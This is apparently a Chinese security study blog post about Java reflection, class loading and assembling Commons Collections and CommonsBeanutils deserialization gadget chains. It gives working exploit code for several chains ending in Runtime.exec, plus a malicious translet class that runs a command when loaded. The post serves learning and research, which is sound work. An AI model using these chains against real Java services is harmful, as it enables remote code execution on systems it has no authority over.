---
title: "反射-双亲委派和动态类加载-CC链组装"
description: "Java 反射、双亲委派与动态类加载总结，围绕 CC 链组装思路做整理。"
pubDate: "2026-05-01"
updatedDate: "2026-05-01"
tags: ["Java", "反序列化", "Web安全"]
cover: auto
coverAlt: "反射-双亲委派和动态类加载-CC链组装 的文章封面"
draft: false
---
# 反射

反射是Java中可以动态更改对象属性调用对象方法的重要途经，也是Java反序列化漏洞中常用的一个操作，是Java的重要特性。

反射允许使用者动态地操作类，通过反射我们可以获得对象的成员变量，方法，构造器等内容，再很多框架中被使用和利用。

反射本质是java程序运行时动态加载类并获取类的详细信息，如当我们创建一个类的时候，会触发JVM将该类的.class加载到内存，该.class被加载到内存后，JVM会生成一个Class对象，对于同一个类加载器来说一个类只能产生一个Class对象。

## 反射API

Java 的反射 API 提供了一系列的类和接口来操作 Class 对象。主要的类包括：

- java.lang.Class：表示类的对象。提供了方法来获取类的字段、方法、构造函数等。
- java.lang.reflect.Field：表示类的字段（属性）。提供了访问和修改字段的能力。
- java.lang.reflect.Method：表示类的方法。提供了调用方法的能力。
- java.lang.reflect.Constructor：表示类的构造函数。提供了创建对象的能力。

## 工作流程

获取Class对象有以下三种方法

```java
类字面量
Class c = String.class;
对象实例
String name = "aaa";
Class c = name.getClass();
Class.forName方法加载
Class c = Class.forName("java.lang.String");
```

然后我们就可以获取这个目标类（如这里的String.class）的的构造器，属性，方法等内容，如果是私有的，我们可以通过getDeclaredxxx来获得。

具体内容可以参考网络中的其他详细讲解，反射其实就是一个类似镜子的机制，让我们可以照出一个类具有的各种内容。

但是反射在java反序列化漏洞中的利用十分常见，动态的更改一个实例的值可以让我们想让我们的链子触发时再触发，防止利用链提前触发。

### 动态代理[参考动态代理](https://liaoxuefeng.com/books/java/reflection/proxy/index.html)

一般来讲我们写了一个接口会写一个它的实现类，动态代理的方法是让我们可以不用写它的实现类，而是通过JDK提供的一个Proxy.newProxyInstance()创建了一个接口对象，同时我们要自己创建一个InvocationHandler的实例。

一般是这样

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

public class Main {
    public static void main(String[] args) {
        InvocationHandler handler = new InvocationHandler() {
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                System.out.println(method);
                if (method.getName().equals("morning")) {
                    System.out.println("Good morning, " + args[0]);
                }
                return null;
            }
        };
        Hello hello = (Hello) Proxy.newProxyInstance(
            Hello.class.getClassLoader(), // 传入ClassLoader，为了确保后面实现的接口类被加载
            new Class[] { Hello.class }, // 传入要实现的接口
            handler); // 传入处理调用方法的InvocationHandler
        hello.morning("Bob");
    }
}

interface Hello {
    void morning(String name);
}
```

动态代理并没有多神秘，本质上只是让JVM在运行时动态创建class字节码加载的过程。

# 双亲委派和动态类加载

## 双亲委派

双亲委派模型的原理比较简单，首先我们有处理自定义类加载器外的三个加载器，分别是:

1. 启动类加载器（Bootstrap ClassLoader）
2. 扩展类加载器（Extension ClassLoader）
3. 应用程序类加载器（Application ClassLoader）

双亲委派的原理就是，我们首先要加载一个类之前会将这个类委派给父类加载器，直到启动类加载器，然后再一层一层加载，上一层加载不了就传下来，直到加载完成，启动类加载器因为是C++实现，所以getClassLoader的结果为null，当然双亲委派模型下会用缓存去优化，被加载过的类都会在缓存中，向上传之前会先再缓存中查找。

双亲委派有如下优点:

1. 安全
2. 避免重复类加载

首先为什么说安全呢，如果是从下往上加载就有可能导致用户定义一个不安全的String类被加载，依照双亲委派模型，就不会加载那个不安全的类，所以具有安全的作用。

然后为什么说可以避免重复类加载呢，因为是先传上去从上至下去加载可以避免一个类被几个类加载器重复加载。

但是有两个情况会打破这个双亲委派模型比如JNDI（Java Naming and Directory Interface，Java 命名与目录接口）和JDBC。

JNDI需要调用独立厂商在应用程序下的classpath下的JNDI接口提供者的代码（SPI, Service Provider Interface），但是启动类加载器不可能认识这些代码，这是双亲委派模型存在的问题。

JNDI和JDBC都是存在可攻击的点的一种实现，这个我们后面再讲。

## 动态类加载

```java
ClassLoader -> SecureClassLoader -> URLClassLoader -> APPClassLoader
loadClass -> findClass(重写的方法) -> defineClass(从字节码加载类)
```

这里可以利用URLClassLoader因为这个可以实现对file协议，jar协议，http实现类加载，其中http最方便但是需要出网。

然后就是利用ClassLoader.defineClass来实现动态类加载（私有）

或者用Unsafe.defineClass来字节码加载（类不能实际生成，Spring可以）

# CC链组装

## CC1

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap map = new HashMap();
        map.put("value","aaa");
        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser.bin");
```

上面是一个最简单的CC1链，大致流程是基于transform方法的利用，我们一步步往上推，找到InvokerTransformer，ChainedTransformer，TransformedMap，再到AnnotationInvocationHandler，最终我们利用被装饰过的mapEntry来实现最终利用，map在访问过程中触发，但是这个链子与ysoserial的CC1链不一样，我们看看ysoserial的CC1实现。

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
```

这里的大体思路一致，但是ysoserial使用的LazyMap而不是我们使用的TransformedMap，所以比我们多走了一步到最终的AnnotationInvocationHandler，这里ysoserial可以不用一定是用Target.class但是需要一层动态代理，利用get来实现。

不同于TransformedMap map里需要有值，LazyMap需要我们没有key去调用，然后ysoserial使用了AnnotationInvocationHandler去调用get，然后外面包一层动态代理再传给AnnotationInvocationHandler的readObject方法，实际上这里很巧妙，但是其实使用其他的调用get方法也可以实现最终命令执行，如后面的CC6。不过需要注意的是为了避免序列化提前执行代码，我们需要通过反射后续改值，先传一个安全的Transformer数组。

实际上CC1更偏向一个教学的链，在8u71中AnnotationInvocationHandler的readObject被修复了checkSetValue被拿掉了，所以无法继续使用，这导致我们引入了另一个方法也就是CC6。

## CC6

这个比起CC1就是利用了HashMap，是利用.hashcode来利用，利用了TideMapEntry，首先先调用hashmap的readObject然后对key进行hash，然后我们在key放一个TideMapEntry，调用TideMapEntry的.hashcode方法，然后再转到lazymap的get，不过需要注意的是在这里触发get方法发现key不存在会自动创建需要我们把它给remove了，同时为了防止链子提前触发，我们也需要先传一个无害的chainedtransformer。

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap map = new HashMap();
        Map lazymap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry,"bb");
        Class c = LazyMap.class;
        Field factory = c.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazymap,chainedTransformer);
        lazymap.remove("aaa");
        serialize(hashMap);
        unserialize("ser.bin");
```

## CC3

CC3利用了动态类加载，是一个另外的玩法。

简而言之我们发现templatesimpl下面有一个newtransformer，然后传入了一个getTransletInstance()，同时getTransletInstance()实现了一个_class.newinstance，同时调用了defineTransletClasses，defineTransletClasses中调用了defineclass所以我们可以实现动态类加载，所以我们的_class不能赋值。

```java
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field nameFiled = c.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");
        Field bytecodesFiled = c.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);
        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer(
                        "newTransformer",
                        null,
                        null
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(1);
```

test.java

```java
package org.example;

import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Test extends AbstractTranslet {
    static{
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

这里我们利用了动态类加载实现另一种情况的代码执行，同时我们只需确保过程中的几个值符合要求即可成功完成，本质上我们完全可以把CC1的链子接过来用，但是在ysoserial中，使用了InstantiateTransformer，我们来研究一下，我们通过找newTransformer()发现了TrAXFilter

```java
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        instantiateTransformer.transform(TrAXFilter.class);
```

很巧的是TrAXFilter可以获得一个构造器同时可以进行一个newTransformer()的操作，所需传参与InstantiateTransformer的transform传入一致。

最终形态

```java
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field nameFiled = c.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");
        Field bytecodesFiled = c.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);
        // Field tfactoryField = c.getDeclaredField("_tfactory");
        // tfactoryField.setAccessible(true);
        // tfactoryField.set(templates, new TransformerFactoryImpl());  （反序列化时会自动实现这一部分）
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap map = new HashMap();
        Map lazymap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry,"bb");
        Class l = LazyMap.class;
        Field factory = l.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazymap,chainedTransformer);
        lazymap.remove("aaa");
        serialize(hashMap);
        unserialize("ser.bin");
```

我们不难发现，这么多CC链其实是可以相互截取拼接组装的，比如我们可以取CC1来完成CC3的后续部分，这里也可以使用CC6来完成，同时InstantiateTransformer实现的newTransformer()效果，我们也可以使用InvokerTransformer来替代取获取TrAXFilter的构造器然后newTransformer()。

## CC4

CC4的依赖是CC4.0，通过优先队列PriorityQueue调用到TransformingComparator.compare方法（因为CC4中这里的compare调用了transform），然后后续就是InvokerTransformer的常规玩法，或者你也可以用动态类加载来实现，最后的几步操作可以自己拼接。这里主要是因为CC4中TransformingComparator实现了序列化，让我们可以进行利用。

这里需要修改priorityqueue的size，有两个玩法，一个是反射修改，一个是往优先队列里面放两个内容，使size达标

```java
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field nameFiled = c.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");
        Field bytecodesFiled = c.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        Class p = PriorityQueue.class;
        Field pfield = p.getDeclaredField("size");
        pfield.setAccessible(true);
        pfield.setInt(priorityQueue, 4);
        serialize(priorityQueue);
        unserialize("ser.bin");
```

```java
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field nameFiled = c.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");
        Field bytecodesFiled = c.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
//        Class p = PriorityQueue.class;
//        Field pfield = p.getDeclaredField("size");
//        pfield.setAccessible(true);
//        pfield.setInt(priorityQueue, 4);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class t = transformingComparator.getClass();
        Field tField = t.getDeclaredField("transformer");
        tField.setAccessible(true);
        tField.set(transformingComparator, chainedTransformer);
        serialize(priorityQueue);
        unserialize("ser.bin");
```

## CC2

CC2其实就是CC4把动态类执行换成invokertransformer来用，

```java
Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
//        Class p = PriorityQueue.class;
//        Field pfield = p.getDeclaredField("size");
//        pfield.setAccessible(true);
//        pfield.setInt(priorityQueue, 4);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class t = transformingComparator.getClass();
        Field tField = t.getDeclaredField("transformer");
        tField.setAccessible(true);
        tField.set(transformingComparator, chainedTransformer);
//        serialize(priorityQueue);
        unserialize("ser.bin");
```

或者说我们可以继续动态类加载，但是利用invokertransformer来替换掉前面使用InstantiateTransformer。

```java
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field nameFiled = c.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");
        Field bytecodesFiled = c.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);
        InvokerTransformer<Object, Object> newTransformer = new InvokerTransformer<>(
                "newTransformer",
                new Class[]{},
                new Object[]{}
        );
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
//        Class p = PriorityQueue.class;
//        Field pfield = p.getDeclaredField("size");
//        pfield.setAccessible(true);
//        pfield.setInt(priorityQueue, 4);
        priorityQueue.add(templates);
        priorityQueue.add(templates);
        Class t = transformingComparator.getClass();
        Field tField = t.getDeclaredField("transformer");
        tField.setAccessible(true);
        tField.set(transformingComparator, newTransformer);
        serialize(priorityQueue);
        unserialize("ser.bin");
```

我们注意到这样的打法可以不适用到transformer数组和chainedtransformer这个用法在后续的shiro反序列化漏洞中，如果该shiro存在CC链的依赖，我们也可以这么打，shiro无法利用我们的数组主要是因为tomcat。

相信我们已经发现了CC链的神秘组装效果，实际上每一条CC链都是利用了几个模块进行组装拼起来的。

## CC5

```java
/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
```

这里相当于一个新的入口点，不细讲，就是把CC6前面的HashMap换掉成这里的内容。

## CC7

这里也是一个新的入口点用到了HashTable，Hashtable.readObject最后调了reconstitutionPut，然后利用到我们能传的key的equals方法，然后我们就找谁的equals有问题，最后发现org.apache.commons.collections.map.AbstractMapDecorator.equals然后java.util.AbstractMap.equals，我们就成功回到lazymap后面的步骤也就是cv大法就解决了。关键在于java.util.AbstractMap.equals的利用，还有一个hash碰撞的问题，有兴趣可以试试。

```java

/*
    Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
*/
```

## CC链文字图

我们将目前我们的利用链喂给ai，让ai生成一张文字图如下

```java
# ===============================
#  CC Gadget Chain 模块化拓扑图
# ===============================

[ Entry 入口点 ]
    |
    |  （readObject / toString / equals / hashCode 等）
    ↓
+-----------------------------+
| 触发入口 Entry              |
+-----------------------------+
| AnnotationInvocationHandler |
| HashMap                     |
| Hashtable                   |
| PriorityQueue               |
| BadAttributeValueExpException |
+-----------------------------+
    |
    | 触发调用
    ↓
+-----------------------------+
| Trigger 触发器              |
+-----------------------------+
| Map.entrySet()              | ← CC1
| Map.get()                   | ← CC1 / CC6
| Map.setValue()              | ← TransformedMap
| hashCode()                  | ← CC6
| equals()                    | ← CC7
| compare()                   | ← CC2 / CC4
| toString()                  | ← CC5
+-----------------------------+
    |
    | 将“数据对象”传入
    ↓
+-----------------------------+
| 数据载体 / 中转结构         |
+-----------------------------+
| LazyMap                     |
| TransformedMap              |
| TiedMapEntry                |
| TransformingComparator      |
+-----------------------------+
    |
    | 调用 transformer.transform()
    ↓
+-----------------------------+
| Transformer 链（核心执行流）|
+-----------------------------+
| ConstantTransformer         |
| ChainedTransformer          |
| InvokerTransformer          |
| InstantiateTransformer      |
+-----------------------------+
    |
    | 逐步构造执行路径
    ↓
+-----------------------------+
| Sink（执行点）              |
+-----------------------------+
| Runtime.exec                | ← CC1 / CC2 / CC5 / CC6 / CC7
| TemplatesImpl.newTransformer | ← CC3 / CC4
+-----------------------------+
    |
    ↓
[ RCE / 任意代码执行 ]
```

很显然将链子拆解拼装可以让我们适应更多的环境，同时学习找链的能力。

我们可以分一下哪些是原生JDK，哪些得要有CC依赖，让

```java
# ============================================
# Commons-Collections Gadget 来源分层
# ============================================

## 一、JDK 原生组件（无需依赖）

[ 入口 Entry ]
- sun.reflect.annotation.AnnotationInvocationHandler   (JDK 8u71 前可利用)
- java.util.HashMap
- java.util.Hashtable
- java.util.PriorityQueue
- javax.management.BadAttributeValueExpException

[ 触发方法 Trigger ]
- Map.get()
- Map.put() / setValue()
- hashCode()
- equals()
- toString()
- compare()

[ Sink（执行点）]
- java.lang.Runtime.exec
- com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
- com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter

--------------------------------------------

## 二、Commons-Collections 3.x（CC3）组件

[ 核心利用组件 ]
- org.apache.commons.collections.Transformer
- org.apache.commons.collections.functors.ChainedTransformer
- org.apache.commons.collections.functors.ConstantTransformer
- org.apache.commons.collections.functors.InvokerTransformer

[ Map利用组件 ]
- org.apache.commons.collections.map.LazyMap
- org.apache.commons.collections.map.TransformedMap

[ 桥接组件 ]
- org.apache.commons.collections.keyvalue.TiedMapEntry

--------------------------------------------

## 三、Commons-Collections 4.x（CC4）组件

[ 核心利用组件 ]
- org.apache.commons.collections4.Transformer
- org.apache.commons.collections4.functors.ChainedTransformer
- org.apache.commons.collections4.functors.ConstantTransformer
- org.apache.commons.collections4.functors.InvokerTransformer
- org.apache.commons.collections4.functors.InstantiateTransformer

[ Comparator利用组件 ]
- org.apache.commons.collections4.comparators.TransformingComparator
```

所有的JDK原生的内容对我们来说都是相当重要的。

## CB

最后的CommonsBeanutils链，Commons-Beanutils依赖本质是对javabean的增强，想讲讲什么是javabean。

### javabean

一般javabean的格式就是一个private的属性和可以对属性进行读写判断的public方法，常见的是getter和setter，是一个很常见的格式。

然后我们开始分析，为什么Commons-Beanutils依赖会可以被反序列化漏洞利用。

Commons-Beanutils中有一个PropertyUtils可以进行动态的调用。

简单跟进去分析一下，这个漏洞的漏洞带你主要在于，PropertyUtils.getProperty接受一个对象和需要调用的属性，进行一系列判断，然后将属性转为get属性的形式，属性首字母会自动转为大写，最后会调用invoke执行，然后我们在CC3中使用的templatesimpl中有一个getOutputProperties方法，而且templates可以动态加载类，所以我们成功实现了我们命令执行的前置条件。

我们跟进去找哪里调用了getProperty我们找到了BeanComparator中的compare方法，然后很显然和我们之前的CC链串起来了，利用优先队列进行操作，这里的细节是CB链与CC链之间有一点交织，我们得要将beancomparator中的ComparableComparator.getInstance()换成一个jdk原生的类型。

```java
        //CC3
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");
        Field bytecodesFiled = c.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);
        //CB
        BeanComparator<Object> beanComparator = new BeanComparator<>("outputProperties", new AttrCompare());
        //CC2
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(templates);
        Class p = PriorityQueue.class;
        Field pField = p.getDeclaredField("comparator");
        pField.setAccessible(true);
        pField.set(priorityQueue, beanComparator);
        serialize(priorityQueue);
        unserialize("ser.bin");
```

很显然，CB链其实可以用CC3的部分加上CB的特有类再结合CC2来拼出来，实现了shiro原生反序列化。

到这里相信我们都有些理解了所谓找链是怎么找的，当我们搞明白这些后我们就可以开始JDK原生链的学习。